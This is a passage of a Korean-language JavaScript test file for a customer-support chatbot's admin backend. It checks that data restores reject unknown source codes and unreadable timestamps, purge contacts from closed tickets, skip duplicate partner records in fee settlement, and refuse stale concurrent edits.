  // ③ 길이 상한은 접수를 만드는 쪽과 **같은 수**다.
  assert.ok(t.note.length <= L.TICKET_NOTE_LEN, `메모가 상한을 넘었다(${t.note.length})`);
  assert.ok(t.note.endsWith(L.CLIP_MARK), '줄였는데 줄였다고 말하지 않는다');
  assert.equal(t.contact.length, L.TICKET_CONTACT_LEN, `연락처가 상한을 넘었다(${t.contact.length})`);
  // ④ 접수가 모르는 칸은 들고 오지 않는다 — 조회 응답·백업으로 되나가던 자리다.
  assert.deepEqual(Object.keys(t).filter((k) => k === '몰래끼운칸'), [], '저장분의 모르는 칸이 접수에 남았다');

  // ── ⑤ 숫자로 적힌 연락처도 「있다」로 읽는다 — 끝난 접수에서 파기 대상이 되어야 한다(DS 52-3).
  esc.resetTickets();
  esc.importTickets({
    version: 1, savedAt: at, seq: 2,
    tickets: [
      { ...raw, id: 'ESC-0002', status: 'resolved', summary: undefined, note: undefined, contact: 1012345678 },
    ],
  });
  const closed = esc.getTicket('ESC-0002');
  assert.equal(closed.contact, undefined, '숫자로 적힌 번호가 끝난 접수에 남았다');
  assert.ok(closed.contactPurgedAt, '파기한 사실이 없어 화면이 「연락처 없음」이라 적는다');

  // ── ⑥ 멀쩡한 저장분은 종전 그대로다(이미 가려진 요약·짧은 메모·번호는 한 글자도 바뀌지 않는다).
  esc.resetTickets();
  const clean = {
    ...raw, id: 'ESC-0003', summary: '[상담원 이관 요약] 접수번호 ESC-0003\n개인정보 마스킹: 해당 없음',
    note: '전화 연결 완료', contact: '010-1111-2222', 몰래끼운칸: undefined,
  };
  esc.importTickets({ version: 1, savedAt: at, seq: 3, tickets: [clean] });
  const good = esc.getTicket('ESC-0003');
  assert.equal(good.summary, clean.summary, '멀쩡한 요약이 바뀌었다');
  assert.equal(good.note, clean.note, '멀쩡한 메모가 바뀌었다');
  assert.equal(good.contact, clean.contact, '진행 중인 접수의 연락처를 건드렸다');
  assert.equal(good.piiKinds, undefined, '가린 것이 없는데 있다고 말한다');
  esc.resetTickets();
});

/**
 * DS 54-2 — 대화 기록의 **응답 근거 코드**를 아무도 확인하지 않았다.
 *
 * 채널(`CHANNELS`)·작업 코드(`audit.ACTIONS`)에는 복원 관문이 있는데 「무엇으로 답했는가」에는
 * 없었다. 그래서 저장분이 적어 온 아무 글자나 그 칸에 들어왔고, 화면 네 자리와 내려받기 CSV 가
 * `SOURCE_LABELS[code] ?? code` 로 그려 **그 글자를 운영자에게 그대로 보여 줬다**(DS 22-x 가
 * 「화면에 영문 코드를 내보내지 않는다」를 세운 그 칸이다).
 */
test('대화 기록 복원이 응답 근거를 우리 어휘 안에서만 받는다 (DS 54-2)', opts, async () => {
  const I = await importLib('intents', ['rules', 'normalize']);
  const BOGUS = '고객센터 010-1234-5678 로 전화주세요';

  // ── ⓞ 종전 식 재현: 사전에 없으면 **코드를 되돌려준다**.
  assert.equal(I.SOURCE_LABELS[BOGUS] ?? BOGUS, BOGUS, '재현이 깨졌다 — 사전에 그 코드가 있다');
  // 이름을 붙이는 자는 한 벌이고, 어떤 입력에도 코드를 되돌려주지 않는다(`intentLabel` 과 같은 규칙).
  assert.equal(I.sourceLabel(BOGUS), I.UNKNOWN_SOURCE_LABEL);
  assert.equal(I.sourceLabel(''), I.UNKNOWN_SOURCE_LABEL);
  assert.equal(I.sourceLabel('kb'), '등록 자료', '멀쩡한 코드의 이름이 바뀌었다');
  // 어휘는 **표시명 사전에서 끌어온다** — 손으로 적은 사본이 생기면 근거가 늘 때 한쪽이 빠진다.
  assert.deepEqual([...I.SOURCE_CODES].sort(), Object.keys(I.SOURCE_LABELS).sort());
  assert.equal(I.SOURCE_CODES.has('unknown'), true, '복원이 붙이는 코드가 어휘에 없다');

  process.env.ADMIN_PERSIST = 'false';
  const cl = await pickPii('convlog');
  cl.resetLogs();
  const now = new Date().toISOString();
  const turn = (over) => ({
    id: 'T-000001', sessionId: 's1', channel: 'web', tenant: null,
    message: '배송 언제 와요', reply: '확인해 드릴게요', intent: 'shipping',
    source: 'kb', escalate: false, at: now, ...over,
  });
  const r = cl.importTurns({
    version: 1, savedAt: now, seq: 3,
    turns: [
      turn({ id: 'T-000001', source: BOGUS }),
      turn({ id: 'T-000002', source: 'kb' }),
      turn({ id: 'T-000003', source: undefined }),
    ],
  });
  assert.equal(r.ok, true);
  assert.equal(r.count, 3, '근거를 못 읽었다고 대화 기록을 버렸다');

  // ── ① 모르는 코드는 들고 오지 않는다 — 「알 수 없음」 한 자리로 모인다.
  const all = cl.listAllTurns();
  assert.equal(all.find((l) => l.id === 'T-000001').source, 'unknown', '저장분의 글자가 그대로 들어왔다');
  assert.equal(all.find((l) => l.id === 'T-000003').source, 'unknown', '빈 칸을 멀쩡한 코드로 적었다');
  assert.equal(all.find((l) => l.id === 'T-000002').source, 'kb', '멀쩡한 코드가 바뀌었다');

  // ── ② 내려받기 CSV 의 「근거」 칸에 코드가 뜨지 않는다.
  const csv = cl.turnsToCsv();
  assert.deepEqual(csvTable(csv).rows.map((x) => x['근거']).sort(), ['등록 자료', '알 수 없음', '알 수 없음']);
  assert.equal(csv.includes(BOGUS), false, '저장분의 글자가 파일에 그대로 실렸다');

  // ── ③ 멀쩡한 코드로 **바꿔 적지 않는다** — 집계가 부풀거나 없던 할 일이 생기는 자리다.
  const st = cl.convStats();
  assert.deepEqual(Object.keys(st.bySource).sort(), ['kb', 'unknown'], '근거별 묶음에 모르는 코드가 섰다');
  assert.equal(st.autoHandled, 1, '모르는 근거를 자동 처리로 세었다');
  assert.equal(cl.unansweredQuestions().groups, 0, '「답하지 못한 질문」에 없던 줄이 섰다');
  cl.resetLogs();
});

/**
 * DS 54-3 — 복원이 **시각인 척하는 글자**를 받아들였다.
 *
 * 저장분을 읽어 들이는 문들은 시각 칸을 「문자열이고 비어 있지 않은가」로만 보았다. 그래서
 * `"어제"` 한 글자가 기록에 박히고, 그 글자를 시각으로 믿는 자들이 함께 어긋났다 — 보관 경계가
 * 무너져 대시보드가 **이레 전부를 「기록 있음」**으로 보고(그러면서 0건이라 그린다 · DS 43-1),
 * 내려받은 파일의 「시각」 칸이 빈 칸이 되고, 꼬리 주석은 글자가 빠진 문장으로 나간다.
 */
test('복원이 읽을 수 없는 시각을 받아들이지 않는다 (DS 54-3)', opts, async () => {
  const K = await importLib('kst');
  // ── ⓞ 종전 식 재현: 「문자열이고 비어 있지 않은가」는 `"어제"` 를 그대로 통과시킨다.
  const written = '어제';
  const legacyAt = typeof written === 'string' && written ? written : new Date().toISOString();
  assert.equal(legacyAt, '어제', '재현이 깨졌다');
  assert.ok(Number.isNaN(new Date(legacyAt).getTime()), '재현이 깨졌다 — 읽을 수 있는 값이다');
  assert.equal(K.kstDateTime(legacyAt), '', '읽을 수 없는 값에 시각을 지어낸다');
  // 관문은 한 벌이다 — 읽을 수 있으면 ISO 한 모양으로, 아니면 대신할 값으로.
  assert.equal(K.isReadableInstant('어제'), false);
  assert.equal(K.isReadableInstant(''), false);
  assert.equal(K.isReadableInstant(12345), false, '글자가 아닌 값을 시각으로 읽는다');
  assert.equal(K.isReadableInstant('2026-10-01T00:00:00.000Z'), true);
  assert.equal(K.readInstant('2026-10-01T09:00:00+09:00', 'FB'), '2026-10-01T00:00:00.000Z', '한 모양으로 적지 않는다');
  assert.equal(K.readInstant('어제', 'FB'), 'FB');

  // ── ① 대화 기록: 보관 경계가 무너지면 「그 날 0건」과 「그 날 기록 없음」이 섞인다(DS 43-1).
  process.env.ADMIN_PERSIST = 'false';
  const cl = await pickPii('convlog');
  cl.resetLogs();
  const bad = cl.importTurns({
    version: 1, savedAt: '', seq: 1,
    turns: [{
      id: 'T-000001', sessionId: 's1', channel: 'web', tenant: null,
      message: '안녕', reply: '안녕하세요', intent: 'greeting', source: 'kb', escalate: false, at: '어제',
    }],
  });
  assert.equal(bad.count, 1, '시각을 못 읽었다고 대화 기록을 버렸다');
  const ret = cl.turnRetention();
  assert.equal(K.isReadableInstant(ret.knownFrom), true, `보관 경계가 시각이 아니다(${ret.knownFrom})`);
  const st = cl.convStats();
  assert.equal(st.daily.every((d) => d.coverage === 'full'), false, '이레 전부를 「기록 있음」으로 본다');
  assert.equal(st.daily.filter((d) => d.coverage === 'none').length, 6, '경계 앞을 「기록 없음」이라 말하지 않는다');
  assert.equal(st.today.turns, 1, '보관 중인 턴을 그 날 집계에서 잃었다');
  assert.equal(st.totalTurns, st.daily.reduce((n, d) => n + d.turns, 0), '총계와 날짜별 합이 어긋난다');
  // 파일: 「시각」 칸이 비지 않고, 꼬리 주석도 글자가 빠진 문장으로 나가지 않는다.
  const table = csvTable(cl.turnsToCsv());
  assert.ok(table.rows[0]['시각'], '내려받은 파일의 시각 칸이 비었다');
  assert.ok(table.notes.some((n) => /# \d{4}-\d{2}-\d{2} .+ 이후의 기록만/.test(n)), '모수 안내에 시각이 없다');
  cl.resetLogs();

  // ── ② 변경 이력: 같은 자를 쓴다 — 「시각」 칸·모수 안내·합칠 때 줄을 세우는 자리가 걸려 있다.
  const au = await importLib('audit', ['storage', 'csv', 'kst', 'refusal', 'retention', 'logger', 'monitoring']);
  au.resetAudit();
  const ev = (over) => ({ id: 'A-000001', action: 'kb.upsert', target: 'kb_1', detail: '등록', authed: true, ...over });
  assert.equal(au.importAudit({
    version: 1, savedAt: '', seq: 2,
    events: [ev({ id: 'A-000001', at: '어제' }), ev({ id: 'A-000002', at: '2026-10-01T09:00:00+09:00' })],
  }).ok, true);
  const events = au.listAudit();
  assert.equal(events.length, 2, '시각을 못 읽었다고 변경 이력을 버렸다');
  for (const e of events) assert.equal(K.isReadableInstant(e.at), true, `시각이 아닌 값이 들어왔다(${e.at})`);
  // 읽을 수 있으면 **한 모양**으로 적는다 — 글자 비교로 앞뒤를 가리는 자리가 그 모양을 전제로 돈다.
  assert.equal(events.find((e) => e.id === 'A-000002').at, '2026-10-01T00:00:00.000Z');
  const auditCsv = csvTable(au.auditToCsv());
  for (const row of auditCsv.rows) assert.ok(row['시각'], '변경 이력 파일의 시각 칸이 비었다');
  assert.ok(auditCsv.notes.some((n) => /# \d{4}-\d{2}-\d{2} .+ 이후의 기록만/.test(n)), '모수 안내에 시각이 없다');
  au.resetAudit();

  // ── ③ 평가도 같은 자를 쓴다 — 복원이 받아들이는 시각의 모양은 저장소마다 갈라지지 않는다.
  const fb = await importLib('feedback', ['storage', 'refusal', 'kst', 'logger', 'monitoring']);
  fb.resetFeedback();
  assert.equal(fb.importFeedback({
    version: 1, savedAt: '', seq: 1,
    entries: [{ id: 'F-000001', sessionHash: 'abc', verdict: 'down', citation: '', at: '어제' }],
  }).count, 1);
  assert.equal(K.isReadableInstant(fb.listFeedback()[0].at), true, '평가의 시각이 글자째 들어왔다');
  fb.resetFeedback();

  // ── ④ 접수도 같은 자를 쓴다 — 큐 목록·상세 서랍이 그 값을 그대로 그린다.
  const esc = await pickPii('escalation');
  esc.resetTickets();
  esc.importTickets({
    version: 1, savedAt: '', seq: 1,
    tickets: [{
      id: 'ESC-0001', sessionId: 'web_0123456789abcdef0123456789abcdef', status: 'open',
      reason: 'user_request', reasonCode: 'customer_request', message: '문의',
      createdAt: '어제', updatedAt: '어제',
    }],
  });
  const t = esc.getTicket('ESC-0001');
  assert.equal(K.isReadableInstant(t.createdAt), true, '접수 시각이 글자째 들어왔다');
  assert.equal(K.isReadableInstant(t.updatedAt), true);
  esc.resetTickets();
});

/* ══════════ 디자인 스프린트 — 52차 재감사 (DS 55-1·55-2·55-3) ══════════ */

/**
 * DS 55-3 — 파트너·고객사 복원이 **정산 근거를 바꿔 놓는** 세 가지.
 *
 * 51차(DS 54-3)가 복원 문 넷에 「읽을 수 있는 시각인가」 관문을 세웠는데, 이 저장소는 그
 * 넷에 들지 않았다. 그래서 종전 식(`typeof x === 'string'`)이 그대로 남아 ① `"어제"` 는 물론
 * **빈 문자열**까지 시각 칸에 박혔고 ② 시각이 글자가 아닌 귀속 이력 줄은 거르개에 걸려
 * **통째로 사라졌다** — 이 파일의 첫 원칙이 「귀속 변경은 append-only 이력으로 남긴다, 값만
 * 바꾸면 근거가 사라진다」인데 복원이 그 근거를 지웠다. 그리고 ③ 같은 id 가 두 번 적힌
 * 저장분을 그대로 들여 **정산 수수료를 두 배로** 적었다(「일부 미산출」 경고도 붙지 않는다 — §13).
 */
test('파트너 복원이 시각을 가리고 근거를 지키며 같은 식별자를 두 번 들이지 않는다 (DS 55-3)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const GROUP = ['settlement', 'partners', 'storage', 'logger', 'monitoring', 'csv', 'kst', 'normalize', 'refusal'];
  const pick = (name) => importLib(name, GROUP.filter((n) => n !== name));
  const P = await pick('partners');
  const S = await pick('settlement');
  const K = await pick('kst');
  const AT = new Date('2026-10-21T00:00:00Z');
  const ISO = '2026-10-20T15:30:00.000Z';

  const partner = { id: 'PTR-0001', name: '제이투모로우원', status: 'active', feeRateBp: 1500, createdAt: ISO, updatedAt: ISO };
  const account = (over = {}) => ({
    id: 'ACC-0001', name: '(주)고원', partnerId: 'PTR-0001', source: 'partner',
    status: 'contracted', contractedAt: '2026-01-05', monthlyFeeKrw: 1000000,
    attribution: [{ at: ISO, fromPartnerId: null, toPartnerId: 'PTR-0001', source: 'partner', note: '최초 등록', authed: true }],
    createdAt: ISO, updatedAt: ISO, ...over,
  });
  const snap = (over = {}) => ({ version: 1, savedAt: ISO, partnerSeq: 1, accountSeq: 1, partners: [partner], accounts: [account()], ...over });

  // ── ① 종전 식 재현: 「문자열인가」만 보면 `"어제"` 도 빈 문자열도 통과한다(재현이 깨지면 결함이 없다).
  const legacy = (v) => (typeof v === 'string' ? v : '지금');
  assert.equal(legacy('어제'), '어제', '종전 식이 재현되지 않는다');
  assert.equal(legacy(''), '', '종전 식이 빈 글자를 거른다 — 재현 실패');
  assert.equal(K.isReadableInstant('어제'), false);
  assert.equal(K.isReadableInstant(''), false);

  // ── ② 시각 칸 여섯이 모두 그 관문을 지난다 — 읽을 수 있으면 ISO 한 모양으로 적는다.
  P.resetPartners();
  const r = P.importPartners(snap({
    partners: [{ ...partner, createdAt: '어제', updatedAt: '' }],
    accounts: [account({
      createdAt: '어제',
      updatedAt: '',
      attribution: [
        { at: '어제', fromPartnerId: null, toPartnerId: 'PTR-0001', source: 'partner', note: '최초 등록', authed: true },
        { at: 12345, fromPartnerId: 'PTR-0001', toPartnerId: 'PTR-0002', source: 'referral', note: '소개로 이관', authed: true },
        { at: '2026-10-21T09:00:00+09:00', fromPartnerId: 'PTR-0002', toPartnerId: 'PTR-0001', source: 'partner', note: '되돌림', authed: false },
      ],
    })],
  }), { persist: false });
  assert.equal(r.ok, true);
  const p1 = P.getPartner('PTR-0001');
  const a1 = P.getAccount('ACC-0001');
  for (const [what, v] of [['파트너 등록', p1.createdAt], ['파트너 변경', p1.updatedAt], ['고객사 등록', a1.createdAt], ['고객사 변경', a1.updatedAt]]) {
    assert.equal(K.isReadableInstant(v), true, `${what} 시각이 글자째 들어왔다(${JSON.stringify(v)})`);
  }
  // ── ③ 귀속 근거는 **한 줄도 버리지 않는다** — 시각을 읽지 못했다고 증거를 지우지 않는다.
  assert.equal(a1.attribution.length, 3, '시각을 못 읽었다고 귀속 근거를 버렸다');
  for (const e of a1.attribution) assert.equal(K.isReadableInstant(e.at), true, `귀속 이력의 시각이 글자다(${JSON.stringify(e.at)})`);
  assert.equal(a1.attribution[2].at, '2026-10-21T00:00:00.000Z', '읽을 수 있는 시각을 한 모양으로 적지 않는다');
  assert.equal(a1.attribution[1].note, '소개로 이관', '사라졌던 줄의 근거가 들어오지 않았다');

  // ── ④ 같은 id 는 **먼저 나온 것만** 쓴다 — 정산이 한 고객사를 두 번 세지 않는다.
  P.resetPartners();
  const dup = P.importPartners(snap({ partners: [partner, partner], accounts: [account(), account({ monthlyFeeKrw: 9000000 })] }), { persist: false });
  assert.equal(dup.ok, true);
  assert.equal(dup.duplicates, 2, '건너뛴 중복 수를 말하지 않는다(라우트가 감사 로그·화면에 적는다)');
  assert.equal(P.listPartners().length, 1, '같은 파트너가 두 줄이다');
  assert.equal(P.queryAccounts().length, 1, '같은 고객사가 두 줄이다');
  assert.equal(P.getAccount('ACC-0001').monthlyFeeKrw, 1000000, '먼저 나온 것을 남기지 않았다');
  assert.equal(P.rollupByPartner().filter((x) => x.partnerId === 'PTR-0001').length, 1, '집계에 같은 파트너가 두 줄이다');
  const rep = S.buildSettlement({ month: '2026-02', at: AT });
  assert.equal(rep.report.totals.accounts, 1, '정산이 한 고객사를 두 번 센다');
  assert.equal(rep.report.totals.feeAmountKrw, 150000, '수수료를 두 배로 적는다');
  assert.equal(rep.report.totals.partial, false);

  // ── ⑤ 멀쩡한 저장분은 **한 글자도 바뀌지 않는다**.
  P.resetPartners();
  const good = P.importPartners(snap(), { persist: false });
  assert.equal(good.duplicates, 0, '멀쩡한 저장분에 중복 경고를 붙인다');
  assert.equal(good.orphans, 0);
  assert.deepEqual(P.getAccount('ACC-0001').attribution, account().attribution, '멀쩡한 귀속 이력이 바뀌었다');
  assert.equal(P.getPartner('PTR-0001').createdAt, ISO, '멀쩡한 시각이 바뀌었다');
  assert.equal(S.buildSettlement({ month: '2026-02', at: AT }).report.totals.feeAmountKrw, 150000, '수수료 산출이 바뀌었다');
  P.resetPartners();
});

/**
 * DS 55-3(곁가지) — 커스텀 규칙 복원도 **같은 자**를 쓴다.
 * 복원 문마다 시각을 받아 적는 식이 따로 있으면, 다음 저장소가 또 종전 식을 복사한다.
 */
test('커스텀 규칙 복원이 시각인 척하는 글자를 받아들이지 않는다 (DS 55-3)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const GROUP = ['adminStore', 'knowledge', 'normalize', 'storage', 'rev', 'refusal', 'kst', 'logger', 'monitoring'];
  const A = await importLib('adminStore', GROUP.filter((n) => n !== 'adminStore'));
  const K = await importLib('kst', GROUP.filter((n) => n !== 'kst'));
  const rule = (over) => ({ intent: 'cr_1', label: '영업시간', keywords: ['시간'], reply: '09시~18시', escalate: false, enabled: true, ...over });

  assert.equal(A.importSnapshot({ version: 1, savedAt: '', kb: [], ruleOverrides: {}, customRules: [rule({ createdAt: '어제' })] }, { persist: false }).ok, true);
  assert.equal(K.isReadableInstant(A.listCustomRules()[0].createdAt), true, '규칙의 만든 시각이 글자째 들어왔다');
  // 읽을 수 있는 값은 한 모양으로 적고, 내용은 그대로다.
  A.importSnapshot({ version: 1, savedAt: '', kb: [], ruleOverrides: {}, customRules: [rule({ createdAt: '2026-10-21T09:00:00+09:00' })] }, { persist: false });
  const kept = A.listCustomRules()[0];
  assert.equal(kept.createdAt, '2026-10-21T00:00:00.000Z');
  assert.equal(kept.reply, '09시~18시', '멀쩡한 규칙이 바뀌었다');
});

/* ══════════ 디자인 스프린트 — 53차 재감사 (DS 56-1·56-3) ══════════ */

const P_GROUP = ['settlement', 'partners', 'storage', 'logger', 'monitoring', 'csv', 'kst', 'normalize', 'refusal', 'rev'];
const pickPartnerLib = (name) => importLib(name, P_GROUP.filter((n) => n !== name));

/**
 * DS 56-1 — 찾을 수 없는 귀속을 가진 고객사는 **한 글자도 고칠 수 없었다**.
 *
 * 50차(DS 53-3)는 「귀속 근거를 지울 수 있는 길을 열지 않는다」며 복원이 고아 귀속을 직접
 * 계약으로 되돌리던 것을 막았고, 52차(DS 55-1)는 그 고객사를 화면에 보이게 했다. 그런데
 * **고치는 문**은 그 반대로 서 있었다: 들어온 `partnerId` 가 등록 목록에 없으면 요청 전체를
 * 거절했으므로, 그 고객사의 이름·월 이용료·계약일·담당자까지 전부 막혔다. 돌아오는 말은
 * 「파트너를 먼저 등록해 주세요」였고 **어느 파트너인지도 적지 않았다**. 운영자에게 남은 길은
 * 귀속을 다른 곳으로 옮기거나 직접 계약으로 돌리는 것 — 즉 **고치려면 근거를 버려야** 했다.
 */
test('찾을 수 없는 귀속을 그대로 들고 다른 칸을 고칠 수 있다 (DS 56-1)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const P = await pickPartnerLib('partners');
  const S = await pickPartnerLib('settlement');
  const AT = new Date('2026-10-22T00:00:00Z');
  const ISO = '2026-10-20T15:30:00.000Z';

  const snap = {
    version: 1, savedAt: ISO, partnerSeq: 1, accountSeq: 1,
    // 등록된 파트너는 PTR-0001 하나인데, 고객사는 PTR-0009 에 귀속되어 있다(복원으로 들어오는 길).
    partners: [{ id: 'PTR-0001', name: '제이투모로우원', status: 'active', feeRateBp: 1500, createdAt: ISO, updatedAt: ISO }],
    accounts: [{
      id: 'ACC-0001', name: '(주)고원', partnerId: 'PTR-0009', source: 'partner',
      status: 'contracted', contractedAt: '2026-01-05', monthlyFeeKrw: 1000000,
      attribution: [{ at: ISO, fromPartnerId: null, toPartnerId: 'PTR-0009', source: 'partner', note: '최초 등록', authed: true }],
      createdAt: ISO, updatedAt: ISO,
    }],
  };
  const reload = () => { P.resetPartners(); assert.equal(P.importPartners(snap, { persist: false }).orphans, 1, '고아 귀속이 만들어지지 않았다 — 전제가 깨졌다'); };
  const edit = (over) => P.upsertAccount({
    id: 'ACC-0001', name: '(주)고원', partnerId: 'PTR-0009', source: 'partner',
    status: 'contracted', contractedAt: '2026-01-05', monthlyFeeKrw: 1000000, ...over,
  });

  // ── ① 종전 식 재현: 「등록 목록에 있는가」만 보면 지금 가진 귀속도 거절된다(재현이 깨지면 결함이 없다).
  reload();
  const legacy = (pid) => (pid && !P.listPartners().some((p) => p.id === pid) ? '거절' : '통과');
  assert.equal(legacy('PTR-0009'), '거절', '종전 식이 재현되지 않는다');

  // ── ② 지금 가진 귀속을 **그대로 들고 오면** 다른 칸을 고칠 수 있다.
  const r1 = edit({ name: '(주)고원의원', monthlyFeeKrw: 2000000, ownerName: '이담당' });
  assert.equal(r1.ok, true, `고아 귀속 고객사를 아직 고칠 수 없다: ${r1.ok ? '' : r1.error}`);
  assert.equal(r1.account.name, '(주)고원의원');
  assert.equal(r1.account.monthlyFeeKrw, 2000000);
  // 귀속은 **바뀌지 않았다** — 그러므로 이력도 늘지 않는다(값만 바꾸면 근거가 사라진다는 원칙의 반대편).
  assert.equal(r1.account.partnerId, 'PTR-0009', '귀속이 말없이 바뀌었다');
  assert.equal(r1.account.attribution.length, 1, '바뀌지 않은 귀속에 이력이 늘었다');
  assert.equal(r1.account.attribution[0].note, '최초 등록', '귀속 근거가 바뀌었다');
  // 그 사실이 정산 리포트에 그대로 선다(수수료율을 알 수 없으므로 합계에서 빠지고 경고가 붙는다).
  const rep = S.buildSettlement({ month: '2026-02', at: AT }).report;
  assert.equal(rep.rows.length, 1);
  assert.equal(rep.rows[0].partnerName, P.missingPartnerName('PTR-0009'), '리포트가 다른 이름을 적는다');
  assert.equal(rep.totals.partial, true, '근거가 모자란 행인데 경고가 붙지 않는다');

  // ── ③ **없는 곳으로 옮기는** 길은 종전처럼 막는다(고아 귀속을 새로 만들 수 있으면 안 된다).
  reload();
  const moved = edit({ partnerId: 'PTR-0404' });
  assert.equal(moved.ok, false, '없는 파트너로 귀속을 옮길 수 있다');
  assert.match(moved.error, /존재하지 않는 파트너/);
  assert.equal(P.getAccount('ACC-0001').partnerId, 'PTR-0009', '거절했는데 값이 바뀌었다');

  // ── ④ 등록된 파트너로 옮기는 길·직접 계약으로 돌리는 길은 **이력을 남기고** 열려 있다.
  reload();
  const toReal = edit({ partnerId: 'PTR-0001', attributionNote: '귀속 정리(재등록 대신 이관)' });
  assert.equal(toReal.ok, true);
  assert.equal(toReal.account.attribution.length, 2, '귀속을 옮겼는데 이력이 남지 않았다');
  assert.equal(toReal.account.attribution[1].fromPartnerId, 'PTR-0009', '어디서 왔는지 적지 않았다');
  assert.equal(toReal.account.attribution[1].note, '귀속 정리(재등록 대신 이관)');

  reload();
  const toDirect = edit({ partnerId: '', source: 'direct' });
  assert.equal(toDirect.ok, true);
  assert.equal(toDirect.account.partnerId, null);
  assert.equal(toDirect.account.attribution.length, 2, '직접 계약으로 돌렸는데 이력이 남지 않았다');

  // ── ⑤ 멀쩡한 고객사는 종전과 똑같이 움직인다(없는 파트너를 새로 붙이는 길은 여전히 막힌다).
  P.resetPartners();
  const fresh = P.upsertAccount({ name: '새 고객사', partnerId: 'PTR-0009' });
  assert.equal(fresh.ok, false, '등록 때 없는 파트너가 통과한다');
  P.resetPartners();
});

/**
 * DS 56-3 — 파트너·고객사 편집에 **동시 편집 관문이 없었다**.
 *
 * DS 46-1 이 세운 전제(「쓰기 경로는 전부 덮어쓰기다 — 폼은 칸의 값을 통째로 보내고 서버는
 * 받은 대로 갈아 끼운다」)가 이 저장소에도 그대로인데, 관문은 안내 자료·규칙·접수에만 세워져
 * 있었다. 그래서 두 운영자가 같은 고객사를 열어 두면 나중에 저장한 쪽이 이기고, 먼저 고친 값은
 * 아무 말 없이 사라진다 — 하필 그 칸이 **월 이용료**이고 그 값이 정산 수수료의 기준이다.
 */
test('고객사·파트너 저장이 내가 본 모습 위에서만 갈아 끼운다 (DS 56-3)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const P = await pickPartnerLib('partners');
  const S = await pickPartnerLib('settlement');
  const R = await pickPartnerLib('refusal');
  const AT = new Date('2026-10-22T00:00:00Z');

  P.resetPartners();
  const ptr = P.upsertPartner({ name: '제이투모로우원', feeRateBp: 1500 });
  assert.equal(ptr.ok, true);
  const made = P.upsertAccount({ name: '(주)고원', partnerId: ptr.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-01-05', monthlyFeeKrw: 1000000 });
  assert.equal(made.ok, true);
  const base = P.accountRev(made.account);

  // ── ① 종전 동작 재현: 모습을 들고 가지 않으면 **말없이 되돌아간다**(옵트인 경로는 그대로 둔다).
  const fields = { id: made.account.id, name: '(주)고원', partnerId: ptr.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-01-05' };
  assert.equal(P.upsertAccount({ ...fields, monthlyFeeKrw: 5000000 }).ok, true); // B 가 금액을 올린다
  assert.equal(P.upsertAccount({ ...fields, monthlyFeeKrw: 1000000, ownerName: '이담당' }).ok, true); // A 가 옛 화면으로 저장
  assert.equal(P.getAccount('ACC-0001').monthlyFeeKrw, 1000000, '종전 동작이 재현되지 않는다');
  assert.equal(S.buildSettlement({ month: '2026-02', at: AT }).report.totals.feeAmountKrw, 150000);

  // ── ② 모습을 들고 가면 **거절하고 무엇이 달라졌는지 말한다**.
  const stale = P.upsertAccount({ ...fields, monthlyFeeKrw: 1000000, baseRev: base });
  assert.equal(stale.ok, false, '그 사이 바뀐 고객사를 덮어썼다');
  assert.equal(stale.conflict, 'changed');
  assert.equal(stale.error, R.CHANGED_TARGET_MESSAGE, '거절 문장이 다른 쪽과 갈라졌다');
  assert.equal(stale.current.monthlyFeeKrw, 1000000, '지금 저장된 값을 돌려주지 않는다');
  // 거절은 **아무것도 바꾸지 않는다**.
  assert.equal(P.getAccount('ACC-0001').ownerName, '이담당', '거절했는데 값이 바뀌었다');

  // ── ③ 지금 모습을 들고 오면 지나간다. 그리고 **스스로 바꾸는 값**(변경 시각)은 모습에 들지 않는다
  //      — 들어 있으면 저장할 때마다 영영 어긋난다.
  const nowRev = P.accountRev(P.getAccount('ACC-0001'));
  const okSave = P.upsertAccount({ ...fields, monthlyFeeKrw: 1000000, ownerName: '이담당', baseRev: nowRev });
  assert.equal(okSave.ok, true, `지금 모습인데 거절한다: ${okSave.ok ? '' : okSave.error}`);
  assert.equal(P.accountRev(P.getAccount('ACC-0001')), nowRev, '바뀐 것이 없는데 모습이 달라졌다');
  assert.notEqual(P.getAccount('ACC-0001').updatedAt, undefined);

  // ── ④ 그 사이 **사라진** 대상에는 다른 말을 한다(고객사는 지우지 않지만, 복원이 목록을 갈아 끼운다).
  const gone = P.upsertAccount({ ...fields, id: 'ACC-9999', baseRev: nowRev });
  assert.equal(gone.ok, false);
  assert.equal(gone.conflict, 'gone');
  assert.equal(gone.error, R.STALE_TARGET_MESSAGE);

  // ── ⑤ 파트너 쪽도 같은 자를 쓴다(수수료율이 그 안에 있다 — 사라지면 정산 전체가 흔들린다).
  const pBase = P.partnerRev(P.getPartner(ptr.partner.id));
  assert.equal(P.upsertPartner({ id: ptr.partner.id, name: '제이투모로우원', feeRateBp: 2000 }).ok, true);
  const pStale = P.upsertPartner({ id: ptr.partner.id, name: '제이투모로우원', feeRateBp: 1500, baseRev: pBase });
  assert.equal(pStale.ok, false, '그 사이 바뀐 파트너를 덮어썼다');
  assert.equal(pStale.conflict, 'changed');
  assert.equal(pStale.current.feeRateBp, 2000, '지금 저장된 수수료율을 돌려주지 않는다');
  assert.equal(P.getPartner(ptr.partner.id).feeRateBp, 2000, '거절했는데 값이 바뀌었다');
  assert.equal(P.upsertPartner({ id: ptr.partner.id, name: '제이투모로우원', feeRateBp: 1500, baseRev: P.partnerRev(P.getPartner(ptr.partner.id)) }).ok, true);

  // ── ⑥ 재는 자는 **한 벌**이다 — 한 칸만 달라도 다른 값이 되고, 같은 내용이면 같은 값이다.
  const a = P.getAccount('ACC-0001');
  assert.equal(P.accountRev({ ...a }), P.accountRev(a), '같은 내용이 다른 모습으로 나온다');
  for (const over of [{ name: 'x' }, { partnerId: null }, { status: 'churned' }, { monthlyFeeKrw: 1 }, { memo: 'x' }, { ownerName: 'x' }, { contractedAt: '2026-01-06' }, { source: 'referral' }]) {
    assert.notEqual(P.accountRev({ ...a, ...over }), P.accountRev(a), `달라진 칸을 보지 않는다: ${JSON.stringify(over)}`);
  }
  // 복원·일괄 처리처럼 **겨룰 상대가 없는 자리**는 종전처럼 지나간다(모습을 보내지 않으면 관문이 없다).
  assert.equal(P.upsertAccount({ ...fields, monthlyFeeKrw: 7000000 }).ok, true);
  P.resetPartners();
});

